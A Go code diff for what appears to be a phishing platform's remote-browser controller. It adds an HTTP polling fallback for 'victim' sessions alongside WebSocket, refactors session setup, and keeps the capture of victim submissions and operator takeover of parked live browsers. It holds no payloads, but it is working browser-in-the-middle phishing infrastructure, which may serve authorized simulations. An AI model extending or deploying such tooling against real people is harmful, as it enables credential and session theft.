@@ -10,6 +10,7 @@ import (
 	"image/draw"
 	"image/jpeg"
 	"image/png"
+	"io"
 	"math"
 	"math/rand"
 	"net"
@@ -58,6 +59,14 @@ type activeSession struct {
 	// isTest marks sessions created by the test runner (RunByID) so they are
 	// excluded from the live session list shown to operators.
 	isTest bool
+	// pollTransport is set for sessions whose victim uses the HTTP polling
+	// fallback instead of a WebSocket. nil for WebSocket sessions.
+	pollTransport *pollVictimTransport
+	// pollSID is the polling client's per page-load nonce, used to tell a reload
+	// (which should start a fresh session) from the same page instance still
+	// polling after the session ended (which should stop). Immutable after the
+	// session is published, so it is read without a lock on the poll fast path.
+	pollSID string
 	// browserPage is set (non-nil) only after newSession() is called.
 	browserPageMu sync.Mutex
 	browserPage   *rod.Page
@@ -235,6 +244,232 @@ var wsUpgrader = websocket.Upgrader{
 		}
 		return u.Host == r.Host
 	},
+}
+
+// victim message kinds, aliasing the gorilla WebSocket frame types so the
+// transport abstraction and the WebSocket implementation agree on one value.
+const (
+	victimMsgText   = websocket.TextMessage
+	victimMsgBinary = websocket.BinaryMessage
+)
+
+// errVictimTransportClosed is returned by Recv when the victim is gone.
+var errVictimTransportClosed = fmt.Errorf("victim transport closed")
+
+// victimTransport carries the victim session traffic. The WebSocket
+// implementation wraps the upgraded connection; the polling implementation
+// bridges short HTTP requests into the same session read/write loops. The read
+// loop reads with Recv and the write paths use Send, so both transports inherit
+// the same input validation and session handling.
+type victimTransport interface {
+	// Recv returns the next client message, or an error when the victim is gone.
+	Recv() ([]byte, error)
+	// Send delivers a message toward the victim. Safe for concurrent callers.
+	Send(kind int, data []byte) error
+	// CanStream reports whether binary screencast frames can be delivered. It is
+	// false for polling, where live view is disabled.
+	CanStream() bool
+	// Done is closed when the victim is gone.
+	Done() <-chan struct{}
+	Close() error
+}
+
+// wsVictimTransport is the WebSocket transport. It serializes writes with its
+// own mutex, which replaces the connection mutex the session core used before.
+type wsVictimTransport struct {
+	conn *websocket.Conn
+	mu   sync.Mutex
+	done <-chan struct{}
+}
+
+func newWSVictimTransport(conn *websocket.Conn, done <-chan struct{}) *wsVictimTransport {
+	return &wsVictimTransport{conn: conn, done: done}
+}
+
+func (t *wsVictimTransport) Recv() ([]byte, error) {
+	_, data, err := t.conn.ReadMessage()
+	return data, err
+}
+
+func (t *wsVictimTransport) Send(kind int, data []byte) error {
+	t.mu.Lock()
+	defer t.mu.Unlock()
+	return t.conn.WriteMessage(kind, data)
+}
+
+func (t *wsVictimTransport) CanStream() bool       { return true }
+func (t *wsVictimTransport) Done() <-chan struct{} { return t.done }
+func (t *wsVictimTransport) Close() error          { return t.conn.Close() }
+
+// pollOutboundMax bounds the control messages buffered for a polling victim.
+// Polling carries only small JSON control messages (streaming is off), so
+// overflow is not expected in normal use; dropping the oldest keeps a slow or
+// absent poller from growing memory without bound.
+const pollOutboundMax = 256
+
+// pollIdleTimeout tears down a polling session after this much silence. The
+// client poll cadence is not known to the server (it is a per page client
+// setting), so this is a fixed generous value covering several missed polls even
+// at the maximum client interval.
+const pollIdleTimeout = 30 * time.Second
+
+// pollEndedGrace keeps an ended polling session findable this long so a still
+// polling client drains the final "closed" message and stops, instead of the
+// entry vanishing and the next poll creating a fresh session. Must exceed the
+// maximum client poll interval so at least one more poll lands.
+const pollEndedGrace = 15 * time.Second
+
+// pollVictimTransport bridges short HTTP poll requests into the session loops.
+// POST bodies are pushed onto inbound; the session write paths append to the
+// outbound buffer, which a GET drains.
+type pollVictimTransport struct {
+	inbound   chan []byte
+	mu        sync.Mutex
+	outbound  [][]byte
+	done      chan struct{}
+	closeOnce sync.Once
+	lastPoll  atomic.Int64 // unix nanoseconds of the last drain
+}
+
+func newPollVictimTransport() *pollVictimTransport {
+	t := &pollVictimTransport{
+		inbound: make(chan []byte, 64),
+		done:    make(chan struct{}),
+	}
+	t.lastPoll.Store(time.Now().UnixNano())
+	return t
+}
+
+func (t *pollVictimTransport) Recv() ([]byte, error) {
+	select {
+	case msg := <-t.inbound:
+		return msg, nil
+	case <-t.done:
+		return nil, errVictimTransportClosed
+	}
+}
+
+func (t *pollVictimTransport) Send(kind int, data []byte) error {
+	// Streaming never runs on the poll transport, so binary frames are not
+	// expected; drop them rather than buffering video.
+	if kind != victimMsgText {
+		return nil
+	}
+	select {
+	case <-t.done:
+		return errVictimTransportClosed
+	default:
+	}
+	cp := make([]byte, len(data))
+	copy(cp, data)
+	t.mu.Lock()
+	t.outbound = append(t.outbound, cp)
+	if len(t.outbound) > pollOutboundMax {
+		t.outbound = t.outbound[len(t.outbound)-pollOutboundMax:]
+	}
+	t.mu.Unlock()
+	return nil
+}
+
+func (t *pollVictimTransport) CanStream() bool       { return false }
+func (t *pollVictimTransport) Done() <-chan struct{} { return t.done }
+
+func (t *pollVictimTransport) Close() error {
+	t.closeOnce.Do(func() { close(t.done) })
+	return nil
+}
+
+// push delivers a client message into the session read loop. It drops the
+// message if the inbound buffer is full or the transport is closed.
+func (t *pollVictimTransport) push(msg []byte) {
+	select {
+	case <-t.done:
+		return
+	default:
+	}
+	select {
+	case t.inbound <- msg:
+	case <-t.done:
+	default:
+	}
+}
+
+// sendFinal appends a message regardless of the closed state, so a terminal
+// "closed" can be queued for one last drain as the session is torn down.
+func (t *pollVictimTransport) sendFinal(data []byte) {
+	cp := make([]byte, len(data))
+	copy(cp, data)
+	t.mu.Lock()
+	t.outbound = append(t.outbound, cp)
+	t.mu.Unlock()
+}
+
+// drain returns and clears the buffered outbound messages and records a poll
+// for idle detection.
+func (t *pollVictimTransport) drain() [][]byte {
+	t.lastPoll.Store(time.Now().UnixNano())
+	t.mu.Lock()
+	msgs := t.outbound
+	t.outbound = nil
+	t.mu.Unlock()
+	return msgs
+}
+
+// watchIdle closes the transport when no poll has arrived within timeout, which
+// drives the session teardown path. A lingering session holds a live browser,
+// so an absent victim must end it.
+func (t *pollVictimTransport) watchIdle(ctx context.Context, timeout time.Duration) {
+	tk := time.NewTicker(timeout / 2)
+	defer tk.Stop()
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-t.done:
+			return
+		case <-tk.C:
+			last := time.Unix(0, t.lastPoll.Load())
+			if time.Since(last) > timeout {
+				t.Close()
+				return
+			}
+		}
+	}
+}
+
+// pollSessionCreateMu serializes poll session creation so two concurrent first
+// requests for one recipient do not each spin up a session.
+var pollSessionCreateMu sync.Mutex
+
+// framePollBatch length-prefixes each outbound message (4-byte big-endian length
+// then bytes) so one poll response can carry several.
+func framePollBatch(msgs [][]byte) []byte {
+	if len(msgs) == 0 {
+		return nil
+	}
+	var buf bytes.Buffer
+	var lenb [4]byte
+	for _, msg := range msgs {
+		binary.BigEndian.PutUint32(lenb[:], uint32(len(msg)))
+		buf.Write(lenb[:])
+		buf.Write(msg)
+	}
+	return buf.Bytes()
+}
+
+// decodePollBatch splits a length-prefixed batch back into messages.
+func decodePollBatch(data []byte) [][]byte {
+	var msgs [][]byte
+	for len(data) >= 4 {
+		n := binary.BigEndian.Uint32(data[:4])
+		data = data[4:]
+		if int(n) > len(data) {
+			break
+		}
+		msgs = append(msgs, data[:n])
+		data = data[n:]
+	}
+	return msgs
 }
 
 func modelConfigToRunnerConfig(c nullable.Nullable[model.RemoteBrowserConfig]) remotebrowser.Config {
@@ -601,70 +836,10 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 	if !m.isEnabled(g) {
 		return
 	}
-	crID, err := uuid.Parse(g.Param("crID"))
-	if err != nil {
-		g.AbortWithStatus(http.StatusNotFound)
+	crID, _, cr, rb, ok := m.resolveVictimSession(g)
+	if !ok {
 		return
 	}
-	rbID, err := uuid.Parse(g.Param("rbID"))
-	if err != nil {
-		g.AbortWithStatus(http.StatusNotFound)
-		return
-	}
-
-	// look up campaign recipient to get campaignID / recipientID for capture saving
-	cr, err := m.CampaignRecipientRepository.GetByCampaignRecipientID(g.Request.Context(), &crID)
-	if err != nil {
-		g.AbortWithStatus(http.StatusNotFound)
-		return
-	}
-
-	// look up remote browser script directly (no admin session on this public endpoint)
-	rb, err := m.RemoteBrowserRepository.GetByID(g.Request.Context(), &rbID, &repository.RemoteBrowserOption{})
-	if err != nil {
-		g.AbortWithStatus(http.StatusNotFound)
-		return
-	}
-
-	// verify the script belongs to the same company as the
-	// campaign. A script with no company (nil) is global and usable by any campaign.
-	if rbCompany, err := rb.CompanyID.Get(); err == nil {
-		cid, cidErr := cr.CampaignID.Get()
-		if cidErr != nil {
-			g.AbortWithStatus(http.StatusNotFound)
-			return
-		}
-		campaign, campErr := m.CampaignRepository.GetByID(g.Request.Context(), &cid, &repository.CampaignOption{})
-		if campErr != nil {
-			g.AbortWithStatus(http.StatusNotFound)
-			return
-		}
-		campCompany, campCompanyErr := campaign.CompanyID.Get()
-		if campCompanyErr != nil || campCompany != rbCompany {
-			g.AbortWithStatus(http.StatusNotFound)
-			return
-		}
-	}
-
-	cfg := modelConfigToRunnerConfig(rb.Config)
-
-	conn, err := wsUpgrader.Upgrade(g.Writer, g.Request, nil)
-	if err != nil {
-		return
-	}
-	defer conn.Close()
-	conn.SetReadLimit(64 * 1024)
-
-	var connMu sync.Mutex
-
-	scriptVal, _ := rb.Script.Get()
-	runner := remotebrowser.NewRunner(scriptVal.String(), cfg)
-	runner.ExecPath = m.ExecPath
-	runner.Logger = m.Logger
-	// describe the victim connection so the script can read it via request()
-	// before newSession(), e.g. to pick a proxy by country
-	runner.Request = m.buildRequestInfo(g)
-
 	campaignID, err1 := cr.CampaignID.Get()
 	recipientID, err2 := cr.RecipientID.Get()
 	if err1 != nil || err2 != nil {
@@ -672,18 +847,12 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 		return
 	}
 
-	// wire runScript so the script can invoke saved Scripts by name (callable
-	// mode), scoped to this campaign's company plus global scripts. When the
-	// feature is off RunCallable returns a clear "scripts are not enabled" error.
-	var runScriptCompanyID *uuid.UUID
-	if camp, cErr := m.CampaignRepository.GetByID(g.Request.Context(), &campaignID, &repository.CampaignOption{}); cErr == nil && camp != nil {
-		if cid, cidErr := camp.CompanyID.Get(); cidErr == nil {
-			runScriptCompanyID = &cid
-		}
+	conn, err := wsUpgrader.Upgrade(g.Writer, g.Request, nil)
+	if err != nil {
+		return
 	}
-	runner.RunScript = func(name string, input map[string]interface{}) (map[string]interface{}, error) {
-		return m.ScriptService.RunCallable(context.Background(), runScriptCompanyID, name, input)
-	}
+	defer conn.Close()
+	conn.SetReadLimit(64 * 1024)
 
 	// Use a background context for the runner so the victim's HTTP connection
 	// closing (which cancels g.Request.Context()) does not kill a keepAlive
@@ -697,29 +866,140 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 		CreatedAt:   time.Now(),
 	}
 	sess.victimConnected.Store(true)
+	if !m.installSession(crID.String(), sess, cancel) {
+		return
+	}
+	// The WebSocket transport blocks for the lifetime of the socket, so the core
+	// runs inline here.
+	transport := newWSVictimTransport(conn, g.Request.Context().Done())
+	m.runVictimSession(ctx, g.Request, m.buildRequestInfo(g), transport, rb, sess)
+}
 
-	// One active session per campaign recipient, cancel any previous one.
-	// Exception: if the previous session is in keepAlive state the script has
-	// parked and is waiting for operator takeover; cancelling it would destroy
-	// a live browser the operator may be about to use. In that case put the
-	// old session back and drop the new connection instead.
-	crIDStr := crID.String()
+// resolveVictimSession parses crID/rbID from the public victim URL, loads the
+// campaign recipient and the remote browser script, and verifies the script
+// belongs to the same company as the campaign. It writes a uniform 404 on any
+// failure so the endpoint does not reveal which part was wrong. ok is false when
+// the caller must stop.
+func (m *RemoteBrowserController) resolveVictimSession(g *gin.Context) (uuid.UUID, uuid.UUID, *model.CampaignRecipient, *model.RemoteBrowser, bool) {
+	fail := func() (uuid.UUID, uuid.UUID, *model.CampaignRecipient, *model.RemoteBrowser, bool) {
+		g.AbortWithStatus(http.StatusNotFound)
+		return uuid.UUID{}, uuid.UUID{}, nil, nil, false
+	}
+	crID, err := uuid.Parse(g.Param("crID"))
+	if err != nil {
+		return fail()
+	}
+	rbID, err := uuid.Parse(g.Param("rbID"))
+	if err != nil {
+		return fail()
+	}
+	// look up campaign recipient to get campaignID / recipientID for capture saving
+	cr, err := m.CampaignRecipientRepository.GetByCampaignRecipientID(g.Request.Context(), &crID)
+	if err != nil {
+		return fail()
+	}
+	// look up remote browser script directly (no admin session on this public endpoint)
+	rb, err := m.RemoteBrowserRepository.GetByID(g.Request.Context(), &rbID, &repository.RemoteBrowserOption{})
+	if err != nil {
+		return fail()
+	}
+	// verify the script belongs to the same company as the campaign. A script
+	// with no company (nil) is global and usable by any campaign.
+	if rbCompany, err := rb.CompanyID.Get(); err == nil {
+		cid, cidErr := cr.CampaignID.Get()
+		if cidErr != nil {
+			return fail()
+		}
+		campaign, campErr := m.CampaignRepository.GetByID(g.Request.Context(), &cid, &repository.CampaignOption{})
+		if campErr != nil {
+			return fail()
+		}
+		campCompany, campCompanyErr := campaign.CompanyID.Get()
+		if campCompanyErr != nil || campCompany != rbCompany {
+			return fail()
+		}
+	}
+	return crID, rbID, cr, rb, true
+}
+
+// installSession registers sess under crID, honoring the keepAlive exception: a
+// parked keepAlive session (waiting for operator takeover) must not be replaced
+// by a new victim connection. Returns false when the parked session was kept and
+// the caller must stop.
+func (m *RemoteBrowserController) installSession(crIDStr string, sess *activeSession, cancel context.CancelFunc) bool {
 	if prev, hadPrev := m.RemoteBrowserService.SwapSession(crIDStr, sess); hadPrev {
 		if prev.IsKeepAlive() {
 			m.RemoteBrowserService.StoreSession(crIDStr, prev)
 			cancel()
-			return
+			return false
 		}
 		prev.Cancel()
 	}
+	return true
+}
+
+// runVictimSession runs the session core shared by the WebSocket and polling
+// transports. It blocks until the session ends, so the WebSocket handler calls
+// it directly and the polling handler calls it in a goroutine. sess must already
+// be installed in the session store.
+func (m *RemoteBrowserController) runVictimSession(
+	ctx context.Context,
+	req *http.Request,
+	reqInfo *remotebrowser.RequestInfo,
+	transport victimTransport,
+	rb *model.RemoteBrowser,
+	sess *activeSession,
+) {
+	cfg := modelConfigToRunnerConfig(rb.Config)
+	scriptVal, _ := rb.Script.Get()
+	runner := remotebrowser.NewRunner(scriptVal.String(), cfg)
+	runner.ExecPath = m.ExecPath
+	runner.Logger = m.Logger
+	// describe the victim connection so the script can read it via request()
+	// before newSession(), e.g. to pick a proxy by country
+	runner.Request = reqInfo
+
+	campaignID := sess.CampaignID
+	recipientID := sess.RecipientID
+	crIDStr := sess.CRID.String()
+	cancel := sess.cancel
+
+	// wire runScript so the script can invoke saved Scripts by name (callable
+	// mode), scoped to this campaign's company plus global scripts. When the
+	// feature is off RunCallable returns a clear "scripts are not enabled" error.
+	var runScriptCompanyID *uuid.UUID
+	if camp, cErr := m.CampaignRepository.GetByID(ctx, &campaignID, &repository.CampaignOption{}); cErr == nil && camp != nil {
+		if cid, cidErr := camp.CompanyID.Get(); cidErr == nil {
+			runScriptCompanyID = &cid
+		}
+	}
+	runner.RunScript = func(name string, input map[string]interface{}) (map[string]interface{}, error) {
+		return m.ScriptService.RunCallable(context.Background(), runScriptCompanyID, name, input)
+	}
+
 	defer func() {
 		// For keepAlive sessions the runner is still parked waiting for the
 		// operator, do not cancel or remove it here. CloseLiveSession handles
 		// cleanup when the operator explicitly ends the session.
-		if !sess.isKeepAlive.Load() {
-			m.RemoteBrowserService.CompareAndDeleteSession(crIDStr, sess)
-			cancel()
+		if sess.isKeepAlive.Load() {
+			transport.Close()
+			return
 		}
+		cancel()
+		if pt, isPoll := transport.(*pollVictimTransport); isPoll {
+			// Tell a still-polling client the session is over so it stops, and
+			// keep the entry findable briefly so that final message is drained
+			// before removal. Without this a client that keeps polling after the
+			// script ends would create a fresh session on its next poll.
+			pt.sendFinal([]byte(`{"type":"closed"}`))
+			pt.Close()
+			time.AfterFunc(pollEndedGrace, func() {
+				m.RemoteBrowserService.CompareAndDeleteSession(crIDStr, sess)
+			})
+			return
+		}
+		m.RemoteBrowserService.CompareAndDeleteSession(crIDStr, sess)
+		transport.Close()
 	}()
 
 	var activeNamedStreams sync.Map // name → *streamInfo
@@ -778,7 +1058,7 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 		const streamPasteMinInterval = 200 * time.Millisecond
 
 		for {
-			_, msg, err := conn.ReadMessage()
+			msg, err := transport.Recv()
 			if err != nil {
 				sess.victimConnected.Store(false)
 				select {
@@ -947,13 +1227,20 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 					return
 				}
 				if cmd.Op == "start" {
+					// Live view is disabled on the polling fallback; tell the script
+					// and skip rather than starting a stream that cannot be delivered.
+					if !transport.CanStream() {
+						payload, _ := json.Marshal(map[string]interface{}{"type": "log", "message": "live view is unavailable over the polling fallback"})
+						transport.Send(victimMsgText, payload)
+						continue
+					}
 					if val, exists := activeNamedStreams.LoadAndDelete(cmd.Name); exists {
 						val.(*streamInfo).cancel()
 					}
 					streamCtx, streamCancel := context.WithCancel(cmd.Page.GetContext())
 					si := &streamInfo{cancel: streamCancel, maxFps: cmd.MaxFps, quality: cmd.Quality}
 					activeNamedStreams.Store(cmd.Name, si)
-					go m.runNamedStream(streamCtx, cmd.Page, sess, &connMu, conn, cmd.Selector, cmd.Name, si)
+					go m.runNamedStream(streamCtx, cmd.Page, sess, transport, cmd.Selector, cmd.Name, si)
 				} else if cmd.Op == "stop" {
 					if val, exists := activeNamedStreams.LoadAndDelete(cmd.Name); exists {
 						val.(*streamInfo).cancel()
@@ -963,8 +1250,8 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 		}
 	}()
 
-	clientIP := utils.ExtractClientIP(g.Request, m.TrustedProxies)
-	userAgent := g.Request.UserAgent()
+	clientIP := utils.ExtractClientIP(req, m.TrustedProxies)
+	userAgent := req.UserAgent()
 
 	// processEvent handles server-side effects for a RunEvent (DB writes, session state
 	// updates). Uses context.Background() so a victim disconnect does not cause DB writes
@@ -972,9 +1259,9 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 	processEvent := func(evt remotebrowser.RunEvent) {
 		switch evt.Type {
 		case "capture":
-			m.saveCaptureEvent(context.Background(), g.Request, &campaignID, &recipientID, evt.Value, clientIP, userAgent)
+			m.saveCaptureEvent(context.Background(), req, &campaignID, &recipientID, evt.Value, clientIP, userAgent)
 		case "submit":
-			m.saveSubmitEvent(context.Background(), g.Request, &campaignID, &recipientID, evt.Value, clientIP, userAgent)
+			m.saveSubmitEvent(context.Background(), req, &campaignID, &recipientID, evt.Value, clientIP, userAgent)
 		case "error":
 			m.saveInfoEvent(context.Background(), &campaignID, &recipientID, evt.Message, clientIP, userAgent)
 		case "info":
@@ -1011,10 +1298,10 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 	// cancelling the runner (which must stay alive for keepAlive sessions).
 	// On disconnect, drain any buffered events so a keep_alive arriving simultaneously
 	// with the disconnect is not silently lost.
-	reqCtx := g.Request.Context()
+	done := transport.Done()
 	for {
 		select {
-		case <-reqCtx.Done():
+		case <-done:
 			// Victim disconnected. Non-blocking drain of buffered events to catch
 			// a keep_alive or capture that arrived at the same time as the disconnect.
 			for {
@@ -1046,14 +1333,147 @@ func (m *RemoteBrowserController) ServeVictim(g *gin.Context) {
 			if err != nil {
 				continue
 			}
-			connMu.Lock()
-			writeErr := conn.WriteMessage(websocket.TextMessage, payload)
-			connMu.Unlock()
+			writeErr := transport.Send(victimMsgText, payload)
 			if writeErr != nil {
 				return
 			}
 		}
 	}
+}
+
+// PollVictimRecv is the downstream half of the polling fallback. The victim GETs
+// it on the configured interval; it returns the buffered control messages and
+// closes. It creates the session on first contact, the same as a WebSocket
+// connect, and is keyed on the same crID.
+func (m *RemoteBrowserController) PollVictimRecv(g *gin.Context) {
+	if !m.isEnabled(g) {
+		return
+	}
+	// A drain never creates a session: a client that keeps polling after the
+	// session ended must not respawn it. Creation happens on the first POST.
+	pt, ok := m.pollSession(g, false)
+	if !ok {
+		if !g.IsAborted() {
+			g.Data(http.StatusOK, "application/octet-stream", nil)
+		}
+		return
+	}
+	g.Data(http.StatusOK, "application/octet-stream", framePollBatch(pt.drain()))
+}
+
+// PollVictimSend is the upstream half of the polling fallback. The victim POSTs a
+// length-prefixed batch of client messages, each decoded and fed into the same
+// session read loop as the WebSocket path, so the same validation applies.
+func (m *RemoteBrowserController) PollVictimSend(g *gin.Context) {
+	if !m.isEnabled(g) {
+		return
+	}
+	pt, ok := m.pollSession(g, true)
+	if !ok {
+		if !g.IsAborted() {
+			g.Status(http.StatusNoContent)
+		}
+		return
+	}
+	body, err := io.ReadAll(io.LimitReader(g.Request.Body, 64*1024))
+	if err != nil {
+		g.AbortWithStatus(http.StatusBadRequest)
+		return
+	}
+	for _, msg := range decodePollBatch(body) {
+		pt.push(msg)
+	}
+	g.Status(http.StatusNoContent)
+}
+
+// pollSession returns the poll transport for the recipient. When create is
+// false (a GET drain) it never creates a session, so a client that keeps polling
+// after the session ended cannot respawn it; it returns ok=false and the caller
+// sends an empty response. When create is true (a POST) it creates the session
+// on first contact, serialized so two concurrent first requests do not each
+// start one. A conflict (a WebSocket/test session owns the recipient) aborts
+// with 409.
+func (m *RemoteBrowserController) pollSession(g *gin.Context, create bool) (*pollVictimTransport, bool) {
+	crID, err := uuid.Parse(g.Param("crID"))
+	if err != nil {
+		g.AbortWithStatus(http.StatusNotFound)
+		return nil, false
+	}
+	crIDStr := crID.String()
+	sid := g.Query("s") // per page-load nonce from the client
+
+	// Fast path: the owning page instance attaching to its existing session.
+	// Taken on every active poll, so it uses no lock and no DB lookup. pollSID
+	// and pollTransport are immutable after the session is published.
+	if existing, had := m.RemoteBrowserService.LoadSession(crIDStr); had {
+		if as, ok := existing.(*activeSession); ok && as.pollTransport != nil && sid == as.pollSID {
+			return as.pollTransport, true
+		}
+	}
+
+	// Slow path: first contact, reload, a conflicting WebSocket session, or a
+	// drain with no session. Serialized so two concurrent first requests do not
+	// each start a session.
+	pollSessionCreateMu.Lock()
+	defer pollSessionCreateMu.Unlock()
+
+	if existing, had := m.RemoteBrowserService.LoadSession(crIDStr); had {
+		as, isActive := existing.(*activeSession)
+		if !isActive || as.pollTransport == nil {
+			// a WebSocket (or test) session already owns this recipient; do not disturb it
+			g.AbortWithStatus(http.StatusConflict)
+			return nil, false
+		}
+		if sid == as.pollSID {
+			return as.pollTransport, true
+		}
+		// A different page load (reload). Only a creating request starts fresh,
+		// replacing the old session the way a WebSocket reconnect does; a drain
+		// from a non-owning instance gets nothing.
+		if !create {
+			return nil, false
+		}
+		// fall through to create and replace the old session via installSession
+	} else if !create {
+		return nil, false
+	}
+
+	// Create path only: resolve the recipient/script and run the company
+	// authorization check (DB). Kept off the hot poll path above.
+	_, _, cr, rb, resolved := m.resolveVictimSession(g)
+	if !resolved {
+		return nil, false // 404 already written
+	}
+
+	campaignID, err1 := cr.CampaignID.Get()
+	recipientID, err2 := cr.RecipientID.Get()
+	if err1 != nil || err2 != nil {
+		g.AbortWithStatus(http.StatusInternalServerError)
+		return nil, false
+	}
+
+	pt := newPollVictimTransport()
+	ctx, cancel := context.WithCancel(context.Background())
+	sess := &activeSession{
+		cancel:        cancel,
+		CampaignID:    campaignID,
+		RecipientID:   recipientID,
+		CRID:          crID,
+		CreatedAt:     time.Now(),
+		pollTransport: pt,
+		pollSID:       sid,
+	}
+	sess.victimConnected.Store(true)
+	if !m.installSession(crIDStr, sess, cancel) {
+		return nil, false // parked keepAlive session preserved
+	}
+	// Fixed idle timeout: the poll cadence is a client concern and not known to
+	// the server, so tear the session down after a generous silence rather than
+	// sizing to any configured interval. Covers several missed polls even at the
+	// maximum client interval.
+	go pt.watchIdle(ctx, pollIdleTimeout)
+	go m.runVictimSession(ctx, g.Request, m.buildRequestInfo(g), pt, rb, sess)
+	return pt, true
 }
 
 // liveSessionInfo is the JSON shape returned by the live session list/get endpoints.
@@ -2192,17 +2612,14 @@ func (m *RemoteBrowserController) runNamedStream(
 	streamCtx context.Context,
 	page *rod.Page,
 	sess *activeSession,
-	connMu *sync.Mutex,
-	conn *websocket.Conn,
+	transport victimTransport,
 	selector string,
 	name string,
 	si *streamInfo,
 ) {
 	sendLog := func(msg string) {
 		payload, _ := json.Marshal(map[string]interface{}{"type": "log", "message": msg})
-		connMu.Lock()
-		conn.WriteMessage(websocket.TextMessage, payload) //nolint:errcheck
-		connMu.Unlock()
+		transport.Send(victimMsgText, payload) //nolint:errcheck
 	}
 
 	// Get element CSS bounding rect (values are in CSS pixels, scale-invariant via viewport).
@@ -2251,9 +2668,7 @@ func (m *RemoteBrowserController) runNamedStream(
 			"cssWidth":  displayW,
 			"cssHeight": displayH,
 		})
-		connMu.Lock()
-		conn.WriteMessage(websocket.TextMessage, startPayload) //nolint:errcheck
-		connMu.Unlock()
+		transport.Send(victimMsgText, startPayload) //nolint:errcheck
 	}
 
 	// requeryRect re-reads the element rect, updating the crop origin. Element moves and
@@ -2338,9 +2753,7 @@ func (m *RemoteBrowserController) runNamedStream(
 		select {
 		case <-streamCtx.Done():
 			stopPayload, _ := json.Marshal(map[string]string{"type": "stream_stop", "name": name})
-			connMu.Lock()
-			conn.WriteMessage(websocket.TextMessage, stopPayload) //nolint:errcheck
-			connMu.Unlock()
+			transport.Send(victimMsgText, stopPayload) //nolint:errcheck
 			return
 		case <-ticker.C:
 			// Periodically re-check the element rect for moves or resizes (CSS
@@ -2380,9 +2793,7 @@ func (m *RemoteBrowserController) runNamedStream(
 				ticker.Reset(fastInterval)
 			}
 			lastFrame = data
-			connMu.Lock()
-			writeErr := conn.WriteMessage(websocket.BinaryMessage, buildStreamFrameMsg(name, data))
-			connMu.Unlock()
+			writeErr := transport.Send(victimMsgBinary, buildStreamFrameMsg(name, data))
 			if writeErr != nil {
 				return
 			}
